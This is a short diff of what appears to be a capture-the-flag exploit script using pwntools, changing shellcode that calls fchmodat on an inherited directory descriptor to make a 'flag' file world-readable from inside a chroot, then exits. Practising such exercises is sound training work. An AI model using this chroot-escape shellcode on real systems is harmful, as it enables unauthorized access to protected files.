@@ -14,9 +14,8 @@ warnings.simplefilter("ignore")
 # inside the chroot()ed environment.
 
 assembly = str()
-assembly += shellcraft.amd64.pushstr("flag")
-assembly += shellcraft.amd64.linux.syscall("SYS_fchmodat", 3, "rsp", 0o0777)
-assembly += shellcraft.amd64.linux.syscall("SYS_exit", 0);
+assembly += shellcraft.fchmodat(3, "flag", 0o0777)
+assembly += shellcraft.exit(0);
 
 # the hostname will always be the same as challenge binary
 
